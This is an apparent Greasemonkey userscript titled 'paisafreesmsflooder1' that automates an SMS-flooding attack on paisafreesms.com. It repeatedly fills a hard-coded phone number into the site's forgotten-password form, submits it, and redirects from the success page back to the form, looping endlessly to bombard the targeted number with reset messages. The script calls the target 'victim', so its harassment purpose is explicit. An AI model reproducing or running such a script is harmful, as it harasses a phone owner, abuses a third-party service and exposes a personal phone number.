// ==UserScript==
// @name           paisafreesmsflooder1
// @namespace      nandu 
// @include        http://*paisafreesms.com/*
// ==/UserScript==

var victim = "";

if(document.location=="http://www.paisafreesms.com/forgetpass.aspx")
{
document.forms[0].elements[4].value = 7503359343;
document.forms[0].elements[5].click();

}
if(document.location=="http://www.paisafreesms.com/Forgetpasssucess.aspx")
{
document.location="http://www.paisafreesms.com/forgetpass.aspx";